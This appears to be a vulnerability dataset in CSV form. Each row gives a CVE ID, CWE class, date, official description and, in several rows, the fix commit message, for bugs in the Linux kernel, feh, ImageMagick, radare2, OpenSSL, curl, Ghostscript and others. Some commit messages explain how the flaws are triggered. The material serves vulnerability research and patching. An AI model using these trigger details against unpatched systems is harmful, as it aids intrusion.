CVE-2017-7875,CWE-787,2017-04-14,"In wallpaper.c in feh before v2.18.3, if a malicious client pretends to be the E17 window manager, it is possible to trigger an out-of-boundary heap write while receiving an IPC message. An integer overflow leads to a buffer overflow and/or a double free.","If a malicious client pretends to be the E17 window manager, it is possible to trigger an out of boundary heap write while receiving an IPC message.  The length of the already received message is stored in an unsigned short, which overflows after receiving 64 KB of data. It's comparably small amount of data and therefore achievable for an attacker.  When len overflows, realloc() will either be called with a small value and therefore chars will be appended out of bounds, or len + 1 will be exactly 0, in which case realloc() behaves like free(). This could be abused for a later double-free attack as it's even possible to overwrite the free information -- but this depends on the malloc implementation.  Signed-off-by: Tobias Stoeckmann <tobias@stoeckmann.org>"
CVE-2014-0238,CWE-119,2014-06-01,The cdf_read_property_info function in cdf.c in the Fileinfo component in PHP before 5.4.29 and 5.5.x before 5.5.13 allows remote attackers to cause a denial of service (infinite loop or out-of-bounds memory access) via a vector that (1) has zero length or (2) is too long.,of properties from accessing random memory.
CVE-2015-7513,CWE-369,2016-02-08,"arch/x86/kvm/x86.c in the Linux kernel before 4.4 does not reset the PIT counter values during state restoration, which allows guest OS users to cause a denial of service (divide-by-zero error and host OS crash) via a zero value, related to the kvm_vm_ioctl_set_pit and kvm_vm_ioctl_set_pit2 functions.","Currently if userspace restores the pit counters with a count of 0 on channels 1 or 2 and the guest attempts to read the count on those channels, then KVM will perform a mod of 0 and crash.  This will ensure that 0 values are converted to 65536 as per the spec.  This is CVE-2015-7513.  Signed-off-by: Andy Honig <ahonig@google.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2016-5358,CWE-20,2016-08-07,"epan/dissectors/packet-pktap.c in the Ethernet dissector in Wireshark 2.x before 2.0.4 mishandles the packet-header data type, which allows remote attackers to cause a denial of service (application crash) via a crafted packet.",We now require that.  Make it so.  Bug: 12440 Change-Id: Iffee520976b013800699bde3c6092a3e86be0d76 Reviewed-on: https://code.wireshark.org/review/15424 Reviewed-by: Guy Harris <guy@alum.mit.edu>
CVE-2018-11380,CWE-125,2018-05-22,The parse_import_ptr() function in radare2 2.5.0 allows remote attackers to cause a denial of service (heap-based out-of-bounds read and application crash) via a crafted Mach-O file.,
CVE-2016-10057,CWE-119,2017-03-23,Buffer overflow in the WriteGROUP4Image function in coders/tiff.c in ImageMagick before 6.9.5-8 allows remote attackers to cause a denial of service (application crash) or have other unspecified impact via a crafted file.,
CVE-2018-11376,CWE-125,2018-05-22,The r_read_le32() function in radare2 2.5.0 allows remote attackers to cause a denial of service (heap-based out-of-bounds read and application crash) via a crafted ELF file.,
CVE-2012-6704,CWE-119,2016-12-28,"The sock_setsockopt function in net/core/sock.c in the Linux kernel before 3.5 mishandles negative values of sk_sndbuf and sk_rcvbuf, which allows local users to cause a denial of service (memory corruption and system crash) or possibly have unspecified other impact by leveraging the CAP_NET_ADMIN capability for a crafted setsockopt system call with the (1) SO_SNDBUF or (2) SO_RCVBUF option.","Use min_t()/max_t() macros, reformat two comments, use !!test_bit() to match !!sock_flag()  Signed-off-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2018-14394,CWE-369,2018-07-19,libavformat/movenc.c in FFmpeg before 4.0.2 allows attackers to cause a denial of service (application crash caused by a divide-by-zero error) with a user crafted Waveform audio file.,
CVE-2011-2517,CWE-119,2012-05-24,Multiple buffer overflows in net/wireless/nl80211.c in the Linux kernel before 2.6.39.2 allow local users to gain privileges by leveraging the CAP_NET_ADMIN capability during scan operations with a long SSID value.,"In both trigger_scan and sched_scan operations, we were checking for the SSID length before assigning the value correctly.  Since the memory was just kzalloc'ed, the check was always failing and SSID with over 32 characters were allowed to go through.  This was causing a buffer overflow when copying the actual SSID to the proper place.  This bug has been there since 2.6.29-rc4.  Cc: stable@kernel.org Signed-off-by: Luciano Coelho <coelho@ti.com> Signed-off-by: John W. Linville <linville@tuxdriver.com>"
CVE-2015-8126,CWE-120,2015-11-13,"Multiple buffer overflows in the (1) png_set_PLTE and (2) png_get_PLTE functions in libpng before 1.0.64, 1.1.x and 1.2.x before 1.2.54, 1.3.x and 1.4.x before 1.4.17, 1.5.x before 1.5.24, and 1.6.x before 1.6.19 allow remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a small bit-depth value in an IHDR (aka image header) chunk in a PNG image.",
CVE-2015-0253,,2015-07-20,"The read_request_line function in server/protocol.c in the Apache HTTP Server 2.4.12 does not initialize the protocol structure member, which allows remote attackers to cause a denial of service (NULL pointer dereference and process crash) by sending a request that lacks a method to an installation that enables the INCLUDES filter and has an ErrorDocument 400 directive specifying a local URI.","     core: Fix a crash introduced in with ErrorDocument 400 pointing      to a local URL-path with the INCLUDES filter active, introduced      in 2.4.11. PR 57531. [Yann Ylavic]   Submitted By: ylavic Committed By: covener      git-svn-id: https://svn.apache.org/repos/asf/httpd/httpd/trunk@1664205 13f79535-47bb-0310-9956-ffa450edef68"
CVE-2013-4254,CWE-20,2013-08-25,The validate_event function in arch/arm/kernel/perf_event.c in the Linux kernel before 3.10.8 on the ARM platform allows local users to gain privileges or cause a denial of service (NULL pointer dereference and system crash) by adding a hardware event to an event group led by a software event.,"It is possible to construct an event group with a software event as a group leader and then subsequently add a hardware event to the group. This results in the event group being validated by adding all members of the group to a fake PMU and attempting to allocate each event on their respective PMU.  Unfortunately, for software events wthout a corresponding arm_pmu, this results in a kernel crash attempting to dereference the ->get_event_idx function pointer.  This patch fixes the problem by checking explicitly for software events and ignoring those in event validation (since they can always be scheduled). We will probably want to revisit this for 3.12, since the validation checks don't appear to work correctly when dealing with multiple hardware PMUs anyway.  Cc: <stable@vger.kernel.org> Reported-by: Vince Weaver <vincent.weaver@maine.edu> Tested-by: Vince Weaver <vincent.weaver@maine.edu> Tested-by: Mark Rutland <mark.rutland@arm.com> Signed-off-by: Will Deacon <will.deacon@arm.com> Signed-off-by: Russell King <rmk+kernel@arm.linux.org.uk>"
CVE-2018-13301,CWE-476,2018-07-05,"In FFmpeg 4.0.1, due to a missing check of a profile value before setting it, the ff_mpeg4_decode_picture_header function in libavcodec/mpeg4videodec.c may trigger a NULL pointer dereference while converting a crafted AVI file to MPEG4, leading to a denial of service.","Fixes: null pointer dereference Fixes: ffmpeg_crash_7.avi  Found-by: Thuan Pham, Marcel Böhme, Andrew Santosa and Alexandru Razvan Caciulescu with AFLSmart Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>"
CVE-2018-12713,,2018-06-24,"GIMP through 2.10.2 makes g_get_tmp_dir calls to establish temporary filenames, which may result in a filename that already exists, as demonstrated by the gimp_write_and_read_file function in app/tests/test-xcf.c. This might be leveraged by attackers to overwrite files or read file content that was intended to be private.","Not sure this is really solving the issue reported, which is that `g_get_tmp_dir()` uses environment variables (yet as g_file_open_tmp() uses g_get_tmp_dir()…). But at least g_file_open_tmp() should create unique temporary files, which prevents overriding existing files (which is most likely the only real attack possible here, or at least the only one I can think of unless some weird vulnerabilities exist in glib)."
CVE-2018-11375,CWE-125,2018-05-22,The _inst__lds() function in radare2 2.5.0 allows remote attackers to cause a denial of service (heap-based out-of-bounds read and application crash) via a crafted binary file.,
CVE-2017-6448,CWE-119,2017-04-03,The dalvik_disassemble function in libr/asm/p/asm_dalvik.c in radare2 1.2.1 allows remote attackers to cause a denial of service (stack-based buffer overflow and application crash) or possibly have unspecified other impact via a crafted DEX file.,
CVE-2016-2053,CWE-310,2016-05-02,"The asn1_ber_decoder function in lib/asn1_decoder.c in the Linux kernel before 4.3 allows attackers to cause a denial of service (panic) via an ASN.1 BER file that lacks a public key, leading to mishandling by the public_key_verify_signature function in crypto/asymmetric_keys/public_key.c.","If the ASN.1 decoder is asked to parse a sequence of objects, non-optional matches get skipped if there's no more data to be had rather than a data-overrun error being reported.  This is due to the code segment that decides whether to skip optional matches (ie. matches that could get ignored because an element is marked OPTIONAL in the grammar) due to a lack of data also skips non-optional elements if the data pointer has reached the end of the buffer.  This can be tested with the data decoder for the new RSA akcipher algorithm that takes three non-optional integers.  Currently, it skips the last integer if there is insufficient data.  Without the fix, #defining DEBUG in asn1_decoder.c will show something like:  	next_op: pc=0/13 dp=0/270 C=0 J=0 	- match? 30 30 00 	- TAG: 30 266 CONS 	next_op: pc=2/13 dp=4/270 C=1 J=0 	- match? 02 02 00 	- TAG: 02 257 	- LEAF: 257 	next_op: pc=5/13 dp=265/270 C=1 J=0 	- match? 02 02 00 	- TAG: 02 3 	- LEAF: 3 	next_op: pc=8/13 dp=270/270 C=1 J=0 	next_op: pc=11/13 dp=270/270 C=1 J=0 	- end cons t=4 dp=270 l=270/270  The next_op line for pc=8/13 should be followed by a match line.  This is not exploitable for X.509 certificates by means of shortening the message and fixing up the ASN.1 CONS tags because:   (1) The relevant records being built up are cleared before use.   (2) If the message is shortened sufficiently to remove the public key, the      ASN.1 parse of the RSA key will fail quickly due to a lack of data.   (3) Extracted signature data is either turned into MPIs (which cope with a      0 length) or is simpler integers specifying algoritms and suchlike      (which can validly be 0); and   (4) The AKID and SKID extensions are optional and their removal is handled      without risking passing a NULL to asymmetric_key_generate_id().   (5) If the certificate is truncated sufficiently to remove the subject,      issuer or serialNumber then the ASN.1 decoder will fail with a 'Cons      stack underflow' return.  This is not exploitable for PKCS#7 messages by means of removal of elements from such a message from the tail end of a sequence:   (1) Any shortened X.509 certs embedded in the PKCS#7 message are survivable      as detailed above.   (2) The message digest content isn't used if it shows a NULL pointer,      similarly, the authattrs aren't used if that shows a NULL pointer.   (3) A missing signature results in a NULL MPI - which the MPI routines deal      with.   (4) If data is NULL, it is expected that the message has detached content and      that is handled appropriately.   (5) If the serialNumber is excised, the unconditional action associated      with it will pick up the containing SEQUENCE instead, so no NULL      pointer will be seen here.       If both the issuer and the serialNumber are excised, the ASN.1 decode      will fail with an 'Unexpected tag' return.       In either case, there's no way to get to asymmetric_key_generate_id()      with a NULL pointer.   (6) Other fields are decoded to simple integers.  Shortening the message      to omit an algorithm ID field will cause checks on this to fail early      in the verification process.   This can also be tested by snipping objects off of the end of the ASN.1 stream such that mandatory tags are removed - or even from the end of internal SEQUENCEs.  If any mandatory tag is missing, the error EBADMSG *should* be produced.  Without this patch ERANGE or ENOPKG might be produced or the parse may apparently succeed, perhaps with ENOKEY or EKEYREJECTED being produced later, depending on what gets snipped.  Just snipping off the final BIT_STRING or OCTET_STRING from either sample should be a start since both are mandatory and neither will cause an EBADMSG without the patches  Reported-by: Marcel Holtmann <marcel@holtmann.org> Signed-off-by: David Howells <dhowells@redhat.com> Tested-by: Marcel Holtmann <marcel@holtmann.org> Reviewed-by: David Woodhouse <David.Woodhouse@intel.com>"
CVE-2016-7910,CWE-416,2016-11-16,Use-after-free vulnerability in the disk_seqf_stop function in block/genhd.c in the Linux kernel before 4.7.1 allows local users to gain privileges by leveraging the execution of a certain stop operation even if the corresponding start operation had failed.,"I got a KASAN report of use-after-free:      ==================================================================     BUG: KASAN: use-after-free in klist_iter_exit+0x61/0x70 at addr ffff8800b6581508     Read of size 8 by task trinity-c1/315     =============================================================================     BUG kmalloc-32 (Not tainted): kasan: bad access detected     -----------------------------------------------------------------------------      Disabling lock debugging due to kernel taint     INFO: Allocated in disk_seqf_start+0x66/0x110 age=144 cpu=1 pid=315             ___slab_alloc+0x4f1/0x520             __slab_alloc.isra.58+0x56/0x80             kmem_cache_alloc_trace+0x260/0x2a0             disk_seqf_start+0x66/0x110             traverse+0x176/0x860             seq_read+0x7e3/0x11a0             proc_reg_read+0xbc/0x180             do_loop_readv_writev+0x134/0x210             do_readv_writev+0x565/0x660             vfs_readv+0x67/0xa0             do_preadv+0x126/0x170             SyS_preadv+0xc/0x10             do_syscall_64+0x1a1/0x460             return_from_SYSCALL_64+0x0/0x6a     INFO: Freed in disk_seqf_stop+0x42/0x50 age=160 cpu=1 pid=315             __slab_free+0x17a/0x2c0             kfree+0x20a/0x220             disk_seqf_stop+0x42/0x50             traverse+0x3b5/0x860             seq_read+0x7e3/0x11a0             proc_reg_read+0xbc/0x180             do_loop_readv_writev+0x134/0x210             do_readv_writev+0x565/0x660             vfs_readv+0x67/0xa0             do_preadv+0x126/0x170             SyS_preadv+0xc/0x10             do_syscall_64+0x1a1/0x460             return_from_SYSCALL_64+0x0/0x6a      CPU: 1 PID: 315 Comm: trinity-c1 Tainted: G    B           4.7.0+ #62     Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014      ffffea0002d96000 ffff880119b9f918 ffffffff81d6ce81 ffff88011a804480      ffff8800b6581500 ffff880119b9f948 ffffffff8146c7bd ffff88011a804480      ffffea0002d96000 ffff8800b6581500 fffffffffffffff4 ffff880119b9f970     Call Trace:      [<ffffffff81d6ce81>] dump_stack+0x65/0x84      [<ffffffff8146c7bd>] print_trailer+0x10d/0x1a0      [<ffffffff814704ff>] object_err+0x2f/0x40      [<ffffffff814754d1>] kasan_report_error+0x221/0x520      [<ffffffff8147590e>] __asan_report_load8_noabort+0x3e/0x40      [<ffffffff83888161>] klist_iter_exit+0x61/0x70      [<ffffffff82404389>] class_dev_iter_exit+0x9/0x10      [<ffffffff81d2e8ea>] disk_seqf_stop+0x3a/0x50      [<ffffffff8151f812>] seq_read+0x4b2/0x11a0      [<ffffffff815f8fdc>] proc_reg_read+0xbc/0x180      [<ffffffff814b24e4>] do_loop_readv_writev+0x134/0x210      [<ffffffff814b4c45>] do_readv_writev+0x565/0x660      [<ffffffff814b8a17>] vfs_readv+0x67/0xa0      [<ffffffff814b8de6>] do_preadv+0x126/0x170      [<ffffffff814b92ec>] SyS_preadv+0xc/0x10  This problem can occur in the following situation:  open()  - pread()     - .seq_start()        - iter = kmalloc() // succeeds        - seqf->private = iter     - .seq_stop()        - kfree(seqf->private)  - pread()     - .seq_start()        - iter = kmalloc() // fails     - .seq_stop()        - class_dev_iter_exit(seqf->private) // boom! old pointer  As the comment in disk_seqf_stop() says, stop is called even if start failed, so we need to reinitialise the private pointer to NULL when seq iteration stops.  An alternative would be to set the private pointer to NULL when the kmalloc() in disk_seqf_start() fails.  Cc: stable@vger.kernel.org Signed-off-by: Vegard Nossum <vegard.nossum@oracle.com> Acked-by: Tejun Heo <tj@kernel.org> Signed-off-by: Jens Axboe <axboe@fb.com>"
CVE-2017-6501,CWE-476,2017-03-06,An issue was discovered in ImageMagick 6.9.7. A specially crafted xcf file could lead to a NULL pointer dereference.,
CVE-2014-8323,CWE-20,2017-10-17,buddy-ng.c in Aircrack-ng before 1.2 Beta 3 allows remote attackers to cause a denial of service (segmentation fault) via a response with a crafted length parameter.,
CVE-2014-4501,CWE-119,2014-07-23,"Multiple stack-based buffer overflows in sgminer before 4.2.2, cgminer before 4.3.5, and BFGMiner before 3.3.0 allow remote pool servers to have unspecified impact via a long URL in a client.reconnect stratum message to the (1) extract_sockaddr or (2) parse_reconnect functions in util.c.",Thanks to Mick Ayzenberg <mick@dejavusecurity.com> for finding this!
CVE-2012-1090,CWE-20,2012-05-17,"The cifs_lookup function in fs/cifs/dir.c in the Linux kernel before 3.2.10 allows local users to cause a denial of service (OOPS) via attempted access to a special file, as demonstrated by a FIFO.","commit 5bccda0 upstream.  The cifs code will attempt to open files on lookup under certain circumstances. What happens though if we find that the file we opened was actually a FIFO or other special file?  Currently, the open filehandle just ends up being leaked leading to a dentry refcount mismatch and oops on umount. Fix this by having the code close the filehandle on the server if it turns out not to be a regular file. While we're at it, change this spaghetti if statement into a switch too.  Reported-by: CAI Qian <caiqian@redhat.com> Tested-by: CAI Qian <caiqian@redhat.com> Reviewed-by: Shirish Pargaonkar <shirishpargaonkar@gmail.com> Signed-off-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Steve French <smfrench@gmail.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2017-7500,CWE-59,2018-08-13,"It was found that rpm did not properly handle RPM installations when a destination path was a symbolic link to a directory, possibly changing ownership and permissions of an arbitrary directory, and RPM files being placed in an arbitrary destination. An attacker, with write access to a directory in which a subdirectory will be installed, could redirect that directory to an arbitrary location and gain root privilege.","Only follow directory symlinks owned by target directory owner or root during verification to match the behavior of fsmVerify() in the new CVE-2017-7500 world order.  The code is klunkier than it should and the logic should use common code with fsmVerify() instead of duplicating it here, but that needs more changes than is comfortable to backport so starting with this.  Also worth noting that the previous ""follow the link"" logic from commit 3ccd774 was not quite right, it'd fail with RPMVERIFY_LSTATFAIL on a broken symlink when it should've ran verification on the symlink itself. This behavior is fixed here too.  Finally, once again fakechroot gets in the way and forces the related verify testcase to be changed to be able to create a valid link. Reuse the replacement testcase for the purpose and add another case for verifying an invalid link."
CVE-2017-9461,CWE-835,2017-06-06,smbd in Samba before 4.4.10 and 4.5.x before 4.5.6 has a denial of service vulnerability (fd_open_atomic infinite loop with high CPU usage and memory consumption) due to wrongly handling dangling symlinks.,
CVE-2016-6905,CWE-125,2016-10-03,The read_image_tga function in gd_tga.c in the GD Graphics Library (aka libgd) before 2.2.3 allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted TGA image.,
CVE-2014-0224,CWE-326,2014-06-05,"OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h does not properly restrict processing of ChangeCipherSpec messages, which allows man-in-the-middle attackers to trigger use of a zero-length master key in certain OpenSSL-to-OpenSSL communications, and consequently hijack sessions or obtain sensitive information, via a crafted TLS handshake, aka the ""CCS Injection"" vulnerability.",
CVE-2016-3178,CWE-125,2017-03-24,The processRequest function in minissdpd.c in MiniSSDPd 1.2.20130907-3 allows local users to cause a denial of service (out-of-bounds memory access and daemon crash) via vectors involving a negative length value.,
CVE-2017-6346,CWE-362,2017-03-01,Race condition in net/packet/af_packet.c in the Linux kernel before 4.9.13 allows local users to cause a denial of service (use-after-free) or possibly have unspecified other impact via a multithreaded application that makes PACKET_FANOUT setsockopt system calls.,"Multiple threads can call fanout_add() at the same time.  We need to grab fanout_mutex earlier to avoid races that could lead to one thread freeing po->rollover that was set by another thread.  Do the same in fanout_release(), for peace of mind, and to help us finding lockdep issues earlier.  Fixes: dc99f60 (""packet: Add fanout support."") Fixes: 0648ab7 (""packet: rollover prepare: per-socket state"") Signed-off-by: Eric Dumazet <edumazet@google.com> Cc: Willem de Bruijn <willemb@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2015-5224,,2017-08-23,The mkostemp function in login-utils in util-linux when used incorrectly allows remote attackers to cause file name collision and possibly other attacks.,"The utils when compiled WITHOUT libuser then mkostemp()ing ""/etc/%s.XXXXXX"" where the filename prefix is argv[0] basename.  An attacker could repeatedly execute the util with modified argv[0] and after many many attempts mkostemp() may generate suffix which makes sense. The result maybe temporary file with name like rc.status ld.so.preload or krb5.keytab, etc.  Note that distros usually use libuser based ch{sh,fn} or stuff from shadow-utils.  It's probably very minor security bug.  Addresses: CVE-2015-5224 Signed-off-by: Karel Zak <kzak@redhat.com>"
CVE-2017-15265,CWE-362,2017-10-16,"Race condition in the ALSA subsystem in the Linux kernel before 4.13.8 allows local users to cause a denial of service (use-after-free) or possibly have unspecified other impact via crafted /dev/snd/seq ioctl calls, related to sound/core/seq/seq_clientmgr.c and sound/core/seq/seq_ports.c.","There is a potential race window opened at creating and deleting a port via ioctl, as spotted by fuzzing.  snd_seq_create_port() creates a port object and returns its pointer, but it doesn't take the refcount, thus it can be deleted immediately by another thread. Meanwhile, snd_seq_ioctl_create_port() still calls the function snd_seq_system_client_ev_port_start() with the created port object that is being deleted, and this triggers use-after-free like:   BUG: KASAN: use-after-free in snd_seq_ioctl_create_port+0x504/0x630 [snd_seq] at addr ffff8801f2241cb1  =============================================================================  BUG kmalloc-512 (Tainted: G    B          ): kasan: bad access detected  -----------------------------------------------------------------------------  INFO: Allocated in snd_seq_create_port+0x94/0x9b0 [snd_seq] age=1 cpu=3 pid=4511  	___slab_alloc+0x425/0x460  	__slab_alloc+0x20/0x40   	kmem_cache_alloc_trace+0x150/0x190 	snd_seq_create_port+0x94/0x9b0 [snd_seq] 	snd_seq_ioctl_create_port+0xd1/0x630 [snd_seq]  	snd_seq_do_ioctl+0x11c/0x190 [snd_seq]  	snd_seq_ioctl+0x40/0x80 [snd_seq]  	do_vfs_ioctl+0x54b/0xda0  	SyS_ioctl+0x79/0x90  	entry_SYSCALL_64_fastpath+0x16/0x75  INFO: Freed in port_delete+0x136/0x1a0 [snd_seq] age=1 cpu=2 pid=4717  	__slab_free+0x204/0x310  	kfree+0x15f/0x180  	port_delete+0x136/0x1a0 [snd_seq]  	snd_seq_delete_port+0x235/0x350 [snd_seq]  	snd_seq_ioctl_delete_port+0xc8/0x180 [snd_seq]  	snd_seq_do_ioctl+0x11c/0x190 [snd_seq]  	snd_seq_ioctl+0x40/0x80 [snd_seq]  	do_vfs_ioctl+0x54b/0xda0  	SyS_ioctl+0x79/0x90  	entry_SYSCALL_64_fastpath+0x16/0x75  Call Trace:   [<ffffffff81b03781>] dump_stack+0x63/0x82   [<ffffffff81531b3b>] print_trailer+0xfb/0x160   [<ffffffff81536db4>] object_err+0x34/0x40   [<ffffffff815392d3>] kasan_report.part.2+0x223/0x520   [<ffffffffa07aadf4>] ? snd_seq_ioctl_create_port+0x504/0x630 [snd_seq]   [<ffffffff815395fe>] __asan_report_load1_noabort+0x2e/0x30   [<ffffffffa07aadf4>] snd_seq_ioctl_create_port+0x504/0x630 [snd_seq]   [<ffffffffa07aa8f0>] ? snd_seq_ioctl_delete_port+0x180/0x180 [snd_seq]   [<ffffffff8136be50>] ? taskstats_exit+0xbc0/0xbc0   [<ffffffffa07abc5c>] snd_seq_do_ioctl+0x11c/0x190 [snd_seq]   [<ffffffffa07abd10>] snd_seq_ioctl+0x40/0x80 [snd_seq]   [<ffffffff8136d433>] ? acct_account_cputime+0x63/0x80   [<ffffffff815b515b>] do_vfs_ioctl+0x54b/0xda0   .....  We may fix this in a few different ways, and in this patch, it's fixed simply by taking the refcount properly at snd_seq_create_port() and letting the caller unref the object after use.  Also, there is another potential use-after-free by sprintf() call in snd_seq_create_port(), and this is moved inside the lock.  This fix covers CVE-2017-15265.  Reported-and-tested-by: Michael23 Yu <ycqzsy@gmail.com> Suggested-by: Linus Torvalds <torvalds@linux-foundation.org> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>"
CVE-2015-2806,CWE-119,2015-04-10,Stack-based buffer overflow in asn1_der_decoding in libtasn1 before 4.4 allows remote attackers to have unspecified impact via unknown vectors.,
CVE-2016-6129,CWE-20,2017-02-13,"The rsa_verify_hash_ex function in rsa_verify_hash.c in LibTomCrypt, as used in OP-TEE before 2.2.0, does not validate that the message length is equal to the ASN.1 encoded data length, which makes it easier for remote attackers to forge RSA signatures or public certificates by leveraging a Bleichenbacher signature forgery attack.",
CVE-2014-3567,CWE-20,2014-10-19,"Memory leak in the tls_decrypt_ticket function in t1_lib.c in OpenSSL before 0.9.8zc, 1.0.0 before 1.0.0o, and 1.0.1 before 1.0.1j allows remote attackers to cause a denial of service (memory consumption) via a crafted session ticket that triggers an integrity-check failure.",
CVE-2019-7397,CWE-401,2019-02-05,"In ImageMagick before 7.0.8-25 and GraphicsMagick through 1.3.31, several memory leaks exist in WritePDFImage in coders/pdf.c.",
CVE-2017-7274,CWE-476,2017-03-27,The r_pkcs7_parse_cms function in libr/util/r_pkcs7.c in radare2 1.3.0 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via a crafted PE file.,
CVE-2012-6647,CWE-20,2014-05-26,"The futex_wait_requeue_pi function in kernel/futex.c in the Linux kernel before 3.5.1 does not ensure that calls have two different futex addresses, which allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact via a crafted FUTEX_WAIT_REQUEUE_PI command.","If uaddr == uaddr2, then we have broken the rule of only requeueing from a non-pi futex to a pi futex with this call. If we attempt this, as the trinity test suite manages to do, we miss early wakeups as q.key is equal to key2 (because they are the same uaddr). We will then attempt to dereference the pi_mutex (which would exist had the futex_q been properly requeued to a pi futex) and trigger a NULL pointer dereference.  Signed-off-by: Darren Hart <dvhart@linux.intel.com> Cc: Dave Jones <davej@redhat.com> Cc: stable@vger.kernel.org Link: http://lkml.kernel.org/r/ad82bfe7f7d130247fbe2b5b4275654807774227.1342809673.git.dvhart@linux.intel.com Signed-off-by: Thomas Gleixner <tglx@linutronix.de>"
CVE-2016-7977,CWE-200,2017-05-23,Ghostscript before 9.21 might allow remote attackers to bypass the SAFER mode protection mechanism and consequently read arbitrary files via the use of the .libfile operator in a crafted postscript document.,
CVE-2013-2237,CWE-119,2013-07-04,"The key_notify_policy_flush function in net/key/af_key.c in the Linux kernel before 3.9 does not initialize a certain structure member, which allows local users to obtain sensitive information from kernel heap memory by reading a broadcast message from the notify_policy interface of an IPSec key_socket.",This field was left uninitialized. Some user daemons perform check against this field.  Signed-off-by: Nicolas Dichtel <nicolas.dichtel@6wind.com> Signed-off-by: Steffen Klassert <steffen.klassert@secunet.com>
CVE-2019-1010295,CWE-20,2019-07-15,Linaro/OP-TEE OP-TEE 3.3.0 and earlier is affected by: Buffer Overflow. The impact is: Memory corruption and disclosure of memory content. The component is: optee_os. The fixed version is: 3.4.0 and later.,"Always check TA parameters from a user TA. This prevents a user TA from passing invalid pointers to a pseudo TA.  Fixes: OP-TEE-2018-0007: ""Buffer checks missing when calling pseudo TAs"".  Signed-off-by: Jens Wiklander <jens.wiklander@linaro.org> Tested-by: Joakim Bech <joakim.bech@linaro.org> (QEMU v7, v8) Reviewed-by: Joakim Bech <joakim.bech@linaro.org> Reported-by: Riscure <inforequest@riscure.com> Reported-by: Alyssa Milburn <a.a.milburn@vu.nl> Acked-by: Etienne Carriere <etienne.carriere@linaro.org>"
CVE-2016-10063,CWE-119,2017-03-02,"Buffer overflow in coders/tiff.c in ImageMagick before 6.9.5-1 allows remote attackers to cause a denial of service (application crash) or have other unspecified impact via a crafted file, related to extend validity.",
CVE-2018-16840,CWE-416,2018-10-31,"A heap use-after-free flaw was found in curl versions from 7.59.0 through 7.61.1 in the code related to closing an easy handle. When closing and cleaning up an 'easy' handle in the `Curl_close()` function, the library code first frees a struct (without nulling the pointer) and might then subsequently erroneously write to a struct field within that already freed struct.",Regression from b46cfbc (7.59.0) CVE-2018-16840 Reported-by: Brian Carpenter (Geeknik Labs)  Bug: https://curl.haxx.se/docs/CVE-2018-16840.html
CVE-2014-4611,CWE-20,2014-07-03,"Integer overflow in the LZ4 algorithm implementation, as used in Yann Collet LZ4 before r118 and in the lz4_uncompress function in lib/lz4/lz4_decompress.c in the Linux kernel before 3.15.2, on 32-bit platforms might allow context-dependent attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a crafted Literal Run that would be improperly handled by programs not complying with an API limitation, a different vulnerability than CVE-2014-4715.","Given some pathologically compressed data, lz4 could possibly decide to wrap a few internal variables, causing unknown things to happen.  Catch this before the wrapping happens and abort the decompression.  Reported-by: ""Don A. Bailey"" <donb@securitymouse.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2016-10266,CWE-369,2017-03-24,"LibTIFF 4.0.7 allows remote attackers to cause a denial of service (divide-by-zero error and application crash) via a crafted TIFF image, related to libtiff/tif_read.c:351:22.",TIFFReadEncodedStrip() that caused an integer division by zero. Reported by Agostino Sarubbo. Fixes http://bugzilla.maptools.org/show_bug.cgi?id=2596
CVE-2011-2486,CWE-264,2012-11-19,"nspluginwrapper before 1.4.4 does not properly provide access to NPNVprivateModeBool variable settings, which could prevent Firefox plugins from determining if they should run in Private Browsing mode and allow remote attackers to bypass intended access restrictions, as demonstrated using Flash.",
CVE-2011-1080,CWE-20,2012-06-21,"The do_replace function in net/bridge/netfilter/ebtables.c in the Linux kernel before 2.6.39 does not ensure that a certain name field ends with a '\0' character, which allows local users to obtain potentially sensitive information from kernel stack memory by leveraging the CAP_NET_ADMIN capability to replace a table, and then reading a modprobe command line.","Struct tmp is copied from userspace.  It is not checked whether the ""name"" field is NULL terminated.  This may lead to buffer overflow and passing contents of kernel stack as a module name to try_then_request_module() and, consequently, to modprobe commandline.  It would be seen by all userspace processes.  Signed-off-by: Vasiliy Kulikov <segoon@openwall.com> Signed-off-by: Patrick McHardy <kaber@trash.net>"
CVE-2018-8784,CWE-120,2018-11-29,FreeRDP prior to version 2.0.0-rc4 contains a Heap-Based Buffer Overflow in function zgfx_decompress_segment() that results in a memory corruption and probably even a remote code execution.,Thanks to Eyal Itkin from Check Point Software Technologies.
CVE-2014-5206,CWE-269,2014-08-18,"The do_remount function in fs/namespace.c in the Linux kernel through 3.16.1 does not maintain the MNT_LOCK_READONLY bit across a remount of a bind mount, which allows local users to bypass an intended read-only restriction and defeat certain sandbox protection mechanisms via a ""mount -o remount"" command within a user namespace.","Kenton Varda <kenton@sandstorm.io> discovered that by remounting a read-only bind mount read-only in a user namespace the MNT_LOCK_READONLY bit would be cleared, allowing an unprivileged user to the remount a read-only mount read-write.  Correct this by replacing the mask of mount flags to preserve with a mask of mount flags that may be changed, and preserve all others.   This ensures that any future bugs with this mask and remount will fail in an easy to detect way where new mount flags simply won't change.  Cc: stable@vger.kernel.org Acked-by: Serge E. Hallyn <serge.hallyn@ubuntu.com> Signed-off-by: ""Eric W. Biederman"" <ebiederm@xmission.com>"
CVE-2018-16863,CWE-78,2018-12-03,"It was found that RHSA-2018:2918 did not fully fix CVE-2018-16509. An attacker could possibly exploit another variant of the flaw and bypass the -dSAFER protection to, for example, execute arbitrary shell commands via a specially crafted PostScript document. This only affects ghostscript 9.07 as shipped with Red Hat Enterprise Linux 7.",
